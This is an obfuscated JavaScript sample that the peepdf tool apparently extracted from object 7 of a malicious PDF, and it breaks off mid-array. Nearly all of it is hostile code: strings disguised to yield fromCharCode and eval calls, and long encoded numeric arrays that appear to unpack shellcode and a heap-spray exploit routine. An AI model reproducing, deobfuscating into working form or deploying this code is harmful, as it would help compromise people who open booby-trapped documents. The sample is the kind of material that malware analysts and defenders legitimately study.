// peepdf comment: Javascript code located in object 7 (version 0)

var fknxy = "fknxy";
ikmsw = true;
ghlmx = '';
aghs = 61316;
bejnv = true;
dpstv = "dpstv";
bghtx = false;
qswy = 58471;
var fhrstv = false,
    bglorw = false,
    ahnp = true,
    bcmrtw = "",
    cdglou = "",
    bijt = 0,
    bdkmny = String,
    ehmqvx = bdkmny['fSrcocm4CQh5acrcCSoSdcec'.replace(/[cQS54]/g, '')],
    zvag = String,
    zrlqt = zvag['e7vuaql7'.replace(/[7Iuoq]/g, '')],
    ekorsw = "96",
    acinw = "",
    cgtx = [70, 64, 66, 156, 174, 164, 156, 170, 162, 165, 167, 86, 159, 159, 177, 149, 162, 170, 97, 175, 154, 168, 172, 166, 101, 86, 165, 155, 167, 95, 180, 67, 67, 63, 66, 173, 161, 159, 165, 155, 89, 94, 178, 151, 171, 169, 169, 100, 165, 155, 167, 157, 173, 158, 89, 96, 89, 104, 89, 114, 89, 162, 158, 164, 98, 177, 70, 64, 66, 63, 66, 175, 154, 168, 172, 166, 89, 97, 118, 86, 178, 151, 171, 169, 169, 113, 70, 64, 66, 63, 182, 67, 67, 63, 66, 175, 154, 168, 172, 166, 89, 115, 89, 175, 154, 168, 172, 166, 103, 169, 174, 152, 172, 170, 171, 159, 167, 157, 97, 102, 101, 86, 165, 155, 167, 101, 107, 95, 116, 67, 67, 63, 66, 168, 158, 170, 174, 168, 167, 86, 178, 151, 171, 169, 169, 113, 70, 64, 66, 179, 70, 64, 70, 64, 66, 156, 174, 164, 156, 170, 162, 165, 167, 86, 174, 170, 162, 162, 152, 166, 171, 159, 167, 170, 159, 94, 98, 177, 70, 64, 66, 63, 175, 151, 171, 86, 169, 151, 178, 162, 168, 151, 157, 86, 118, 86, 174, 164, 158, 169, 156, 151, 169, 155, 97, 88, 94, 171, 126, 120, 126, 111, 94, 171, 105, 102, 105, 103, 94, 171, 110, 108, 105, 102, 94, 171, 122, 103, 111, 106, 94, 171, 105, 102, 108, 102, 94, 171, 105, 102, 105, 102, 94, 171, 109, 102, 113, 120, 94, 171, 113, 120, 105, 121, 94, 171, 106, 121, 112, 102, 94, 171, 113, 120, 122, 122, 94, 171, 105, 110, 109, 102, 94, 171, 124, 105, 110, 123, 94, 171, 113, 120, 110, 107, 94, 171, 113, 120, 126, 121, 94, 171, 105, 110, 109, 107, 94, 171, 108, 105, 110, 104, 94, 171, 124, 103, 125, 104, 94, 171, 105, 105, 124, 104, 94, 171, 106, 102, 108, 104, 94, 171, 113, 102, 109, 102, 94, 171, 105, 102, 108, 110, 94, 171, 127, 107, 112, 107, 94, 171, 124, 104, 113, 120, 94, 171, 110, 122, 110, 119, 94, 171, 105, 106, 124, 104, 94, 171, 110, 107, 105, 102, 94, 171, 126, 121, 113, 120, 94, 171, 110, 103, 110, 103, 94, 171, 110, 108, 110, 105, 94, 171, 111, 102, 110, 109, 94, 171, 110, 122, 113, 120, 94, 171, 108, 105, 105, 110, 94, 171, 113, 120, 124, 102, 94, 171, 105, 121, 112, 107, 94, 171, 127, 123, 113, 120, 94, 171, 112, 108, 105, 105, 94, 171, 113, 120, 108, 121, 94, 171, 112, 110, 109, 123, 94, 171, 124, 124, 105, 105, 94, 171, 110, 103, 113, 120, 94, 171, 110, 104, 106, 121, 94, 171, 110, 103, 113, 120, 94, 171, 110, 104, 107, 106, 94, 171, 112, 103, 113, 120, 94, 171, 109, 123, 106, 106, 94, 171, 112, 107, 113, 111, 94, 171, 113, 120, 127, 121, 94, 171, 107, 102, 112, 103, 94, 171, 127, 109, 105, 105, 94, 171, 109, 119, 114, 111, 94, 171, 109, 104, 122, 122, 94, 171, 108, 120, 111, 102, 94, 171, 127, 121, 110, 107, 94, 171, 105, 106, 112, 107, 94, 171, 124, 102, 108, 105, 94, 171, 108, 109, 126, 120, 94, 171, 127, 124, 108, 105, 94, 171, 109, 107, 105, 105, 94, 171, 114, 109, 105, 121, 94, 171, 124, 124, 113, 120, 94, 171, 112, 107, 122, 123, 94, 171, 107, 120, 127, 122, 94, 171, 109, 124, 127, 111, 94, 171, 126, 110, 110, 103, 94, 171, 127, 124, 114, 106, 94, 171, 127, 124, 127, 124, 94, 171, 124, 105, 108, 120, 94, 171, 112, 106, 111, 103, 94, 171, 126, 120, 105, 104, 94, 171, 113, 120, 125, 111, 94, 171, 105, 121, 109, 107, 94, 171, 110, 123, 114, 104, 94, 171, 127, 104, 105, 105, 94, 171, 126, 102, 125, 103, 94, 171, 124, 108, 105, 105, 94, 171, 124, 111, 108, 105, 94, 171, 123, 109, 105, 124, 94, 171, 110, 124, 105, 110, 94, 171, 126, 103, 124, 103, 94, 171, 105, 105, 105, 104, 94, 171, 105, 105, 124, 119, 94, 171, 113, 120, 124, 124, 94, 171, 105, 105, 105, 103, 94, 171, 113, 111, 124, 104, 94, 171, 127, 110, 109, 107, 94, 171, 113, 120, 111, 103, 94, 171, 127, 110, 109, 107, 94, 171, 110, 123, 110, 124, 94, 171, 124, 111, 110, 120, 94, 171, 110, 107, 124, 105, 94, 171, 126, 121, 113, 120, 94, 171, 126, 110, 110, 103, 94, 171, 127, 124, 109, 111, 94, 171, 127, 124, 127, 124, 94, 171, 111, 110, 110, 102, 94, 171, 111, 102, 126, 110, 94, 171, 105, 106, 123, 124, 94, 171, 111, 121, 126, 110, 94, 171, 127, 124, 127, 124, 94, 171, 108, 105, 127, 124, 94, 171, 110, 104, 125, 104, 94, 171, 127, 124, 110, 104, 94, 171, 105, 110, 112, 107, 94, 171, 125, 102, 127, 124, 94, 171, 109, 107, 113, 111, 94, 171, 113, 120, 127, 121, 94, 171, 127, 121, 109, 107, 94, 171, 124, 105, 124, 111, 94, 171, 113, 120, 110, 107, 94, 171, 113, 105, 126, 121, 94, 171, 105, 121, 126, 121, 94, 171, 109, 107, 113, 122, 94, 171, 110, 102, 127, 106, 94, 171, 109, 107, 124, 108, 94, 171, 112, 107, 127, 106, 94, 171, 109, 107, 124, 108, 94, 171, 112, 104, 127, 107, 94, 171, 109, 107, 124, 108, 94, 171, 111, 121, 127, 108, 94, 171, 109, 107, 124, 108, 94, 171, 111, 122, 127, 109, 94, 171, 109, 107, 124, 108, 94, 171, 111, 124, 127, 110, 94, 171, 109, 107, 124, 108, 94, 171, 111, 123, 127, 111, 94, 171, 109, 107, 124, 108, 94, 171, 107, 123, 127, 119, 94, 171, 109, 107, 124, 108, 94, 171, 111, 106, 127, 120, 94, 171, 109, 107, 124, 108, 94, 171, 111, 121, 127, 121, 94, 171, 109, 107, 124, 108, 94, 171, 111, 121, 127, 122, 94, 171, 109, 107, 124, 108, 94, 171, 105, 102, 127, 123, 94, 171, 122, 102, 126, 110, 94, 171, 127, 124, 127, 124, 94, 171, 110, 102, 127, 124, 94, 171, 110, 122, 111, 110, 94, 171, 106, 103, 113, 119, 94, 171, 126, 110, 106, 108, 94, 171, 127, 124, 106, 107, 94, 171, 127, 124, 127, 124, 94, 171, 124, 106, 113, 105, 94, 171, 113, 107, 105, 121, 94, 171, 112, 106, 124, 102, 94, 171, 111, 119, 106, 107, 94, 171, 111, 119, 105, 102, 94, 171, 127, 124, 105, 102, 94, 171, 105, 121, 112, 107, 94, 171, 112, 107, 127, 124, 94, 171, 111, 119, 105, 110, 94, 171, 127, 124, 105, 102, 94, 171, 113, 107, 125, 102, 94, 171, 112, 107, 124, 102, 94, 171, 109, 102, 105, 105, 94, 171, 124, 105, 124, 111, 94, 171, 124, 102, 108, 105, 94, 171, 124, 105, 124, 111, 94, 171, 108, 105, 110, 109, 94, 171, 113, 120, 124, 102, 94, 171, 107, 106, 109, 121, 94, 171, 113, 120, 105, 121, 94, 171, 107, 106, 112, 121, 94, 171, 127, 121, 105, 110, 94, 171, 122, 119, 127, 105, 94, 171, 124, 105, 110, 124, 94, 171, 109, 121, 113, 120, 94, 171, 105, 106, 107, 106, 94, 171, 108, 111, 113, 102, 94, 171, 113, 120, 105, 102, 94, 171, 112, 106, 124, 103, 94, 171, 109, 102, 105, 108, 94, 171, 108, 110, 113, 102, 94, 171, 112, 107, 105, 102, 94, 171, 107, 120, 127, 119, 94, 171, 124, 105, 124, 103, 94, 171, 113, 120, 110, 107, 94, 171, 113, 105, 126, 121, 94, 171, 111, 106, 126, 121, 94, 171, 113, 122, 110, 105, 94, 171, 127, 102, 109, 107, 94, 171, 108, 105, 110, 109, 94, 171, 110, 102, 125, 120, 94, 171, 109, 107, 124, 108, 94, 171, 111, 120, 127, 102, 94, 171, 109, 107, 124, 108, 94, 171, 111, 107, 127, 103, 94, 171, 109, 107, 124, 108, 94, 171, 112, 104, 127, 104, 94, 171, 109, 107, 124, 108, 94, 171, 111, 123, 127, 105, 94, 171, 109, 107, 124, 108, 94, 171, 111, 107, 127, 106, 94, 171, 109, 107, 124, 108, 94, 171, 111, 121, 127, 107, 94, 171, 109, 107, 124, 108, 94, 171, 108, 105, 127, 108, 94, 171, 109, 107, 124, 108, 94, 171, 108, 104, 127, 109, 94, 171, 109, 107, 124, 108, 94, 171, 107, 123, 127, 110, 94, 171, 109, 107, 124, 108, 94, 171, 111, 106, 127, 111, 94, 171, 109, 107, 124, 108, 94, 171, 111, 121, 127, 119, 94, 171, 109, 107, 124, 108, 94, 171, 111, 121, 127, 120, 94, 171, 110, 122, 113, 110, 94, 171, 126, 110, 127, 121, 94, 171, 127, 124, 105, 120, 94, 171, 127, 124, 127, 124, 94, 171, 111, 110, 110, 102, 94, 171, 109, 105, 111, 110, 94, 171, 113, 123, 127, 111, 94, 171, 113, 102, 126, 110, 94, 171, 127, 124, 127, 123, 94, 171, 113, 120, 127, 124, 94, 171, 113, 122, 127, 110, 94, 171, 114, 121, 109, 107, 94, 171, 109, 106, 111, 119, 94, 171, 126, 110, 110, 102, 94, 171, 127, 124, 112, 123, 94, 171, 127, 124, 127, 124, 94, 171, 109, 107, 113, 122, 94, 171, 111, 119, 126, 102, 94, 171, 110, 102, 106, 102, 94, 171, 112, 105, 126, 110, 94, 171, 127, 124, 127, 124, 94, 171, 113, 105, 127, 124, 94, 171, 106, 121, 124, 106, 94, 171, 109, 107, 113, 122, 94, 171, 110, 102, 126, 102, 94, 171, 109, 107, 113, 122, 94, 171, 110, 102, 114, 121, 94, 171, 110, 105, 110, 105, 94, 171, 110, 105, 110, 105, 94, 171, 110, 105, 110, 105, 94, 171, 112, 107, 127, 124, 94, 171, 124, 109, 105, 110, 94, 171, 114, 121, 109, 107, 94, 171, 105, 102, 109, 106, 94, 171, 105, 102, 105, 102, 94, 171, 127, 124, 110, 105, 94, 171, 110, 124, 125, 109, 94, 171, 123, 108, 105, 124, 94, 171, 110, 120, 124, 102, 94, 171, 124, 105, 124, 111, 94, 171, 113, 120, 110, 107, 94, 171, 110, 103, 126, 121, 94, 171, 110, 105, 110, 103, 94, 171, 110, 109, 110, 108, 94, 171, 109, 104, 111, 119, 94, 171, 112, 104, 126, 110, 94, 171, 105, 102, 105, 102, 94, 171, 113, 120, 105, 102, 94, 171, 108, 105, 125, 110, 94, 171, 113, 107, 127, 108, 94, 171, 110, 111, 125, 120, 94, 171, 109, 107, 124, 109, 94, 171, 111, 103, 127, 110, 94, 171, 111, 107, 107, 123, 94, 171, 124, 109, 112, 110, 94, 171, 127, 121, 109, 107, 94, 171, 105, 102, 111, 107, 94, 171, 105, 102, 105, 102, 94, 171, 110, 108, 112, 123, 94, 171, 109, 107, 113, 122, 94, 171, 110, 102, 127, 110, 94, 171, 126, 110, 110, 108, 94, 171, 105, 102, 110, 103, 94, 171, 105, 102, 105, 102, 94, 171, 110, 102, 110, 111, 94, 171, 123, 103, 126, 110, 94, 171, 127, 124, 127, 123, 94, 171, 113, 107, 127, 124, 94, 171, 110, 111, 124, 102, 94, 171, 112, 106, 110, 111, 94, 171, 113, 122, 108, 111, 94, 171, 105, 103, 109, 108, 94, 171, 126, 110, 110, 102, 94, 171, 105, 102, 108, 120, 94, 171, 105, 102, 105, 102, 94, 171, 127, 110, 113, 120, 94, 171, 109, 107, 113, 122, 94, 171, 110, 102, 127, 110, 94, 171, 107, 103, 126, 110, 94, 171, 127, 124, 127, 124, 94, 171, 113, 107, 127, 124, 94, 171, 110, 111, 124, 102, 94, 171, 112, 106, 110, 111, 94, 171, 110, 109, 105, 121, 94, 171, 105, 103, 126, 110, 94, 171, 127, 124, 127, 124, 94, 171, 110, 111, 127, 124, 94, 171, 109, 106, 124, 108, 94, 171, 127, 124, 108, 110, 94, 171, 110, 102, 112, 105, 94, 171, 109, 107, 113, 122, 94, 171, 127, 123, 127, 110, 94, 171, 110, 110, 105, 102, 94, 171, 109, 107, 113, 122, 94, 171, 110, 102, 127, 110, 94, 171, 126, 110, 110, 109, 94, 171, 127, 123, 112, 106, 94, 171, 127, 124, 127, 124, 94, 171, 110, 111, 110, 111, 94, 171, 109, 108, 109, 108, 94, 171, 127, 105, 108, 120, 94, 171, 122, 119, 112, 121, 94, 171, 110, 123, 110, 124, 94, 171, 124, 111, 110, 120, 94, 171, 110, 107, 124, 105, 94, 171, 126, 121, 113, 120, 94, 171, 110, 105, 110, 103, 94, 171, 111, 102, 111, 108, 94, 171, 108, 104, 123, 103, 94, 171, 105, 102, 126, 110, 94, 171, 105, 102, 105, 102, 94, 171, 110, 110, 105, 102, 94, 171, 105, 110, 108, 110, 94, 171, 105, 105, 112, 106, 94, 171, 126, 120, 109, 102, 94, 171, 109, 102, 127, 111, 94, 171, 110, 122, 113, 120, 94, 171, 113, 102, 105, 110, 94, 171, 109, 104, 127, 120, 94, 171, 105, 110, 112, 107, 94, 171, 125, 120, 108, 105, 94, 171, 106, 110, 113, 119, 94, 171, 124, 105, 113, 120, 94, 171, 106, 109, 126, 120, 94, 171, 106, 110, 108, 110, 94, 171, 106, 103, 112, 108, 94, 171, 108, 105, 109, 102, 94, 171, 113, 106, 124, 111, 94, 171, 112, 106, 125, 120, 94, 171, 109, 102, 105, 121, 94, 171, 105, 110, 108, 110, 94, 171, 127, 120, 112, 107, 94, 171, 127, 123, 109, 102, 94, 171, 126, 120, 124, 120, 94, 171, 108, 105, 127, 104, 94, 171, 113, 111, 124, 102, 94, 171, 127, 121, 109, 107, 94, 171, 109, 107, 113, 120, 94, 171, 110, 120, 127, 121, 94, 171, 124, 105, 124, 111, 94, 171, 105, 104, 108, 104, 94, 171, 112, 106, 111, 110, 94, 171, 112, 102, 112, 106, 94, 171, 107, 124, 108, 119, 94, 171, 111, 124, 107, 124, 94, 171, 112, 107, 112, 111, 94, 171, 111, 121, 111, 123, 94, 171, 111, 123, 111, 103, 94, 171, 107, 123, 111, 106, 94, 171, 112, 104, 111, 124, 94, 171, 107, 124, 111, 109, 94, 171, 112, 104, 111, 108, 94, 171, 111, 109, 111, 103, 94, 171, 112, 105, 112, 107, 94, 171, 111, 109, 107, 124, 94, 171, 111, 119, 111, 110, 94, 171, 112, 105, 112, 103, 94, 171, 108, 104, 112, 109, 94, 171, 111, 107, 107, 123, 94, 171, 111, 107, 112, 110, 94, 171, 111, 110, 105, 102, 94, 171, 112, 106, 112, 106, 94, 171, 108, 119, 112, 102, 94, 171, 107, 124, 107, 124, 94, 171, 112, 111, 111, 124, 94, 171, 111, 123, 112, 107, 94, 171, 111, 103, 111, 121, 94, 171, 111, 106, 111, 123, 94, 171, 111, 124, 107, 123, 94, 171, 111, 109, 112, 104, 94, 171, 111, 108, 107, 124, 94, 171, 111, 103, 112, 104, 94, 171, 112, 107, 111, 109, 94, 171, 107, 124, 112, 105, 94, 171, 111, 121, 111, 105, 94, 171, 111, 105, 111, 111, 94, 171, 107, 123, 111, 120, 94, 171, 111, 110, 112, 102, 94, 171, 108, 124, 112, 102, 94, 171, 108, 122, 112, 104, 94, 171, 105, 102, 105, 102, 91, 95, 116, 67, 67, 63, 66, 172, 154, 168, 89, 164, 168, 166, 89, 115, 89, 171, 167, 155, 172, 153, 154, 166, 158, 94, 91, 91, 174, 102, 122, 102, 122, 91, 174, 102, 122, 102, 122, 91, 174, 102, 122, 102, 122, 91, 174, 102, 122, 102, 122, 88, 98, 67, 67, 63, 66, 172, 154, 168, 89, 158, 158, 151, 169, 152, 165, 165, 156, 161, 89, 115, 89, 164, 168, 166, 89, 97, 89, 166, 154, 175, 165, 165, 154, 154, 116, 67, 67, 63, 66, 172, 154, 168, 89, 152, 162, 157, 155, 162, 168, 153, 164, 86, 118, 86, 174, 164, 158, 169, 156, 151, 169, 155, 97, 88, 94, 171, 105, 119, 105, 119, 94, 171, 105, 119, 105, 119, 91, 95, 116, 67, 67, 63, 66, 172, 154, 168, 89, 158, 158, 151, 157, 155, 171, 169, 162, 176, 158, 86, 118, 86, 107, 102, 116, 67, 67, 63, 66, 172, 154, 168, 89, 169, 169, 168, 154, 175, 89, 115, 89, 158, 158, 151, 157, 155, 171, 169, 162, 176, 158, 86, 100, 86, 161, 155, 154, 166, 155, 162, 168, 153, 164, 100, 165, 155, 167, 157, 173, 158, 116, 67, 67, 63, 66, 173, 161, 159, 165, 155, 89, 94, 155, 159, 160, 152, 165, 165, 156, 161, 103, 162, 158, 164, 160, 170, 161, 86, 117, 86, 172, 166, 171, 151, 178, 95, 180, 67, 67, 63, 66, 63, 155, 159, 160, 152, 165, 165, 156, 161, 89, 97, 118, 86, 155, 159, 160, 152, 165, 165, 156, 161, 116, 67, 67, 63, 66, 179, 70, 64, 66, 63, 175, 151, 171, 86, 159, 159, 165, 162, 155, 162, 168, 153, 164, 86, 118, 86, 155, 159, 160, 152, 165, 165, 156, 161, 103, 169, 174, 152, 172, 170, 171, 159, 167, 157, 97, 102, 101, 86, 172, 166, 171, 151, 178, 95, 116, 67, 67, 63, 66, 172, 154, 168, 89, 152, 165, 165, 156, 161, 89, 115, 89, 152, 162, 157, 155, 162, 168, 153, 164, 100, 172, 171, 155, 169, 173, 168, 162, 164, 160, 94, 105, 98, 89, 152, 162, 157, 155, 162, 168, 153, 164, 100, 165, 155, 167, 157, 173, 158, 102, 169, 169, 168, 154, 175, 98, 113, 70, 64, 66, 63, 176, 158, 162, 162, 158, 86, 97, 152, 165, 165, 156, 161, 103, 162, 158, 164, 160, 170, 161, 97, 172, 166, 171, 151, 178, 86, 117, 86, 105, 174, 109, 102, 105, 102, 105, 95, 180, 67, 67, 63, 66, 63, 155, 162, 168, 153, 164, 86, 118, 86, 155, 162, 168, 153, 164, 86, 100, 86, 155, 162, 168, 153, 164, 86, 100, 86, 159, 159, 165, 162, 155, 162, 168, 153, 164, 113, 70, 64, 66, 63, 182, 67, 67, 63, 66, 172, 154, 168, 89, 163, 158, 163, 152, 151, 171, 168, 154, 175, 89, 115, 89, 164, 158, 173, 89, 119, 171, 168, 154, 175, 97, 95, 116, 67, 67, 63, 66, 156, 168, 168, 89, 94, 175, 151, 171, 86, 162, 86, 118, 86, 105, 113, 89, 159, 89, 114, 89, 103, 109, 102, 105, 113, 89, 159, 100, 97, 98, 177, 70, 64, 66, 63, 66, 163, 158, 163, 152, 151, 171, 168, 154, 175, 148, 159, 150, 86, 118, 86, 155, 162, 168, 153, 164, 86, 100, 86, 161, 155, 154, 166, 155, 162, 168, 153, 164, 113, 70, 64, 66, 63, 182, 67, 67, 63, 66, 172, 154, 168, 89, 164, 174, 163, 89, 115, 89, 103, 107, 111, 114, 111, 114, 111, 114, 111, 114, 111, 114, 111, 114, 111, 114, 111, 114, 111, 114, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 110, 113, 113, 70, 64, 66, 63, 174, 170, 162, 162, 103, 166, 171, 159, 167, 170, 159, 94, 91, 91, 109, 107, 105, 102, 105, 156, 91, 98, 89, 164, 174, 163, 98, 113, 70, 64, 66, 179, 70, 64, 70, 64, 66, 156, 174, 164, 156, 170, 162, 165, 167, 86, 156, 165, 165, 162, 154, 152, 152, 155, 166, 151, 162, 162, 97, 95, 180, 67, 67, 63, 66, 172, 154, 168, 89, 169, 161, 155, 165, 162, 156, 165, 157, 155, 89, 115, 89, 171, 167, 155, 172, 153, 154, 166, 158, 94, 91, 91, 174, 123, 123, 123, 114, 91, 174, 102, 105, 102, 106, 91, 174, 107, 111, 102, 105, 91, 174, 119, 106, 108, 109, 91, 174, 102, 105, 105, 105, 91, 174, 102, 105, 102, 105, 91, 174, 106, 105, 110, 123, 91, 174, 110, 123, 102, 124, 91, 174, 103, 124, 109, 105, 91, 174, 110, 123, 119, 125, 91, 174, 102, 113, 106, 105, 91, 174, 121, 108, 107, 126, 91, 174, 110, 123, 107, 110, 91, 174, 110, 123, 123, 124, 91, 174, 102, 113, 106, 110, 91, 174, 105, 108, 107, 107, 91, 174, 121, 106, 122, 107, 91, 174, 102, 108, 121, 107, 91, 174, 103, 105, 105, 107, 91, 174, 110, 105, 106, 105, 91, 174, 102, 105, 105, 113, 91, 174, 124, 110, 109, 110, 91, 174, 121, 107, 110, 123, 91, 174, 107, 125, 107, 122, 91, 174, 102, 109, 121, 107, 91, 174, 107, 110, 102, 105, 91, 174, 123, 124, 110, 123, 91, 174, 107, 106, 107, 106, 91, 174, 107, 111, 107, 108, 91, 174, 108, 105, 107, 112, 91, 174, 107, 125, 110, 123, 91, 174, 105, 108, 102, 113, 91, 174, 110, 123, 121, 105, 91, 174, 102, 124, 109, 110, 91, 174, 124, 126, 110, 123, 91, 174, 109, 111, 102, 108, 91, 174, 110, 123, 105, 124, 91, 174, 109, 113, 106, 126, 91, 174, 121, 127, 102, 108, 91, 174, 107, 106, 110, 123, 91, 174, 107, 107, 103, 124, 91, 174, 107, 106, 110, 123, 91, 174, 107, 107, 104, 109, 91, 174, 109, 106, 110, 123, 91, 174, 106, 126, 103, 109, 91, 174, 109, 110, 110, 114, 91, 174, 110, 123, 124, 124, 91, 174, 104, 105, 109, 106, 91, 174, 124, 112, 102, 108, 91, 174, 106, 122, 111, 114, 91, 174, 106, 107, 119, 125, 91, 174, 105, 123, 108, 105, 91, 174, 124, 124, 107, 110, 91, 174, 102, 109, 109, 110, 91, 174, 121, 105, 105, 108, 91, 174, 105, 112, 123, 123, 91, 174, 124, 127, 105, 108, 91, 174, 106, 110, 102, 108, 91, 174, 111, 112, 102, 124, 91, 174, 121, 127, 110, 123, 91, 174, 109, 110, 119, 126, 91, 174, 104, 123, 124, 125, 91, 174, 106, 127, 124, 114, 91, 174, 123, 113, 107, 106, 91, 174, 124, 127, 111, 109, 91, 174, 124, 127, 124, 127, 91, 174, 121, 108, 105, 123, 91, 174, 109, 109, 108, 106, 91, 174, 123, 123, 102, 107, 91, 174, 110, 123, 122, 114, 91, 174, 102, 124, 106, 110, 91, 174, 107, 126, 111, 107, 91, 174, 124, 107, 102, 108, 91, 174, 123, 105, 122, 106, 91, 174, 121, 111, 102, 108, 91, 174, 121, 114, 105, 108, 91, 174, 120, 112, 102, 127, 91, 174, 107, 127, 102, 113, 91, 174, 123, 106, 121, 106, 91, 174, 102, 108, 102, 107, 91, 174, 102, 108, 121, 122, 91, 174, 110, 123, 121, 127, 91, 174, 102, 108, 102, 106, 91, 174, 110, 114, 121, 107, 91, 174, 124, 113, 106, 110, 91, 174, 110, 123, 108, 106, 91, 174, 124, 113, 106, 110, 91, 174, 107, 126, 107, 127, 91, 174, 121, 114, 107, 123, 91, 174, 107, 110, 121, 108, 91, 174, 123, 124, 110, 123, 91, 174, 123, 113, 107, 106, 91, 174, 124, 127, 106, 114, 91, 174, 124, 127, 124, 127, 91, 174, 108, 113, 107, 105, 91, 174, 108, 105, 123, 113, 91, 174, 102, 109, 120, 127, 91, 174, 108, 124, 123, 113, 91, 174, 124, 127, 124, 127, 91, 174, 105, 108, 124, 127, 91, 174, 107, 107, 122, 107, 91, 174, 124, 127, 107, 107, 91, 174, 102, 113, 109, 110, 91, 174, 122, 105, 124, 127, 91, 174, 106, 110, 110, 114, 91, 174, 110, 123, 124, 124, 91, 174, 124, 124, 106, 110, 91, 174, 121, 108, 121, 114, 91, 174, 110, 123, 107, 110, 91, 174, 110, 108, 123, 124, 91, 174, 102, 124, 123, 124, 91, 174, 106, 110, 110, 125, 91, 174, 107, 105, 124, 109, 91, 174, 106, 110, 121, 111, 91, 174, 109, 110, 124, 109, 91, 174, 106, 110, 121, 111, 91, 174, 109, 107, 124, 110, 91, 174, 106, 110, 121, 111, 91, 174, 108, 124, 124, 111, 91, 174, 106, 110, 121, 111, 91, 174, 108, 125, 124, 112, 91, 174, 106, 110, 121, 111, 91, 174, 108, 127, 124, 113, 91, 174, 106, 110, 121, 111, 91, 174, 108, 126, 124, 114, 91, 174, 106, 110, 121, 111, 91, 174, 104, 126, 124, 122, 91, 174, 106, 110, 121, 111, 91, 174, 108, 109, 124, 123, 91, 174, 106, 110, 121, 111, 91, 174, 108, 124, 124, 124, 91, 174, 106, 110, 121, 111, 91, 174, 108, 124, 124, 125, 91, 174, 106, 110, 121, 111, 91, 174, 102, 105, 124, 126, 91, 174, 119, 105, 123, 113, 91, 174, 124, 127, 124, 127, 91, 174, 107, 105, 124, 127, 91, 174, 107, 125, 108, 113, 91, 174, 103, 106, 110, 122, 91, 174, 123, 113, 103, 111, 91, 174, 124, 127, 103, 110, 91, 174, 124, 127, 124, 127, 91, 174, 121, 109, 110, 108, 91, 174, 110, 110, 102, 124, 91, 174, 109, 109, 121, 105, 91, 174, 108, 122, 103, 110, 91, 174, 108, 122, 102, 105, 91, 174, 124, 127, 102, 105, 91, 174, 102, 124, 109, 110, 91, 174, 109, 110, 124, 127, 91, 174, 108, 122, 102, 113, 91, 174, 124, 127, 102, 105, 91, 174, 110, 110, 122, 105, 91, 174, 109, 110, 121, 105, 91, 174, 106, 105, 102, 108, 91, 174, 121, 108, 121, 114, 91, 174, 121, 105, 105, 108, 91, 174, 121, 108, 121, 114, 91, 174, 105, 108, 107, 112, 91, 174, 110, 123, 121, 105, 91, 174, 104, 109, 106, 124, 91, 174, 110, 123, 102, 124, 91, 174, 104, 109, 109, 124, 91, 174, 124, 124, 102, 113, 91, 174, 119, 122, 124, 108, 91, 174, 121, 108, 107, 127, 91, 174, 106, 124, 110, 123, 91, 174, 102, 109, 104, 109, 91, 174, 105, 114, 110, 105, 91, 174, 110, 123, 102, 105, 91, 174, 109, 109, 121, 106, 91, 174, 106, 105, 102, 111, 91, 174, 105, 113, 110, 105, 91, 174, 109, 110, 102, 105, 91, 174, 104, 123, 124, 122, 91, 174, 121, 108, 121, 106, 91, 174, 110, 123, 107, 110, 91, 174, 110, 108, 123, 124, 91, 174, 108, 109, 123, 124, 91, 174, 110, 125, 107, 108, 91, 174, 124, 105, 106, 110, 91, 174, 105, 108, 107, 112, 91, 174, 107, 105, 122, 123, 91, 174, 106, 110, 121, 111, 91, 174, 108, 123, 124, 105, 91, 174, 106, 110, 121, 111, 91, 174, 108, 110, 124, 106, 91, 174, 106, 110, 121, 111, 91, 174, 109, 107, 124, 107, 91, 174, 106, 110, 121, 111, 91, 174, 108, 126, 124, 108, 91, 174, 106, 110, 121, 111, 91, 174, 108, 110, 124, 109, 91, 174, 106, 110, 121, 111, 91, 174, 108, 124, 124, 110, 91, 174, 106, 110, 121, 111, 91, 174, 105, 108, 124, 111, 91, 174, 106, 110, 121, 111, 91, 174, 105, 107, 124, 112, 91, 174, 106, 110, 121, 111, 91, 174, 104, 126, 124, 113, 91, 174, 106, 110, 121, 111, 91, 174, 108, 109, 124, 114, 91, 174, 106, 110, 121, 111, 91, 174, 108, 124, 124, 122, 91, 174, 106, 110, 121, 111, 91, 174, 108, 124, 124, 123, 91, 174, 107, 125, 110, 113, 91, 174, 123, 113, 124, 124, 91, 174, 124, 127, 102, 123, 91, 174, 124, 127, 124, 127, 91, 174, 108, 113, 107, 105, 91, 174, 106, 108, 108, 113, 91, 174, 110, 126, 124, 114, 91, 174, 110, 105, 123, 113, 91, 174, 124, 127, 124, 126, 91, 174, 110, 123, 124, 127, 91, 174, 110, 125, 124, 113, 91, 174, 111, 124, 106, 110, 91, 174, 106, 109, 108, 122, 91, 174, 123, 113, 107, 105, 91, 174, 124, 127, 109, 126, 91, 174, 124, 127, 124, 127, 91, 174, 106, 110, 110, 125, 91, 174, 108, 122, 123, 105, 91, 174, 107, 105, 103, 105, 91, 174, 109, 108, 123, 113, 91, 174, 124, 127, 124, 127, 91, 174, 110, 108, 124, 127, 91, 174, 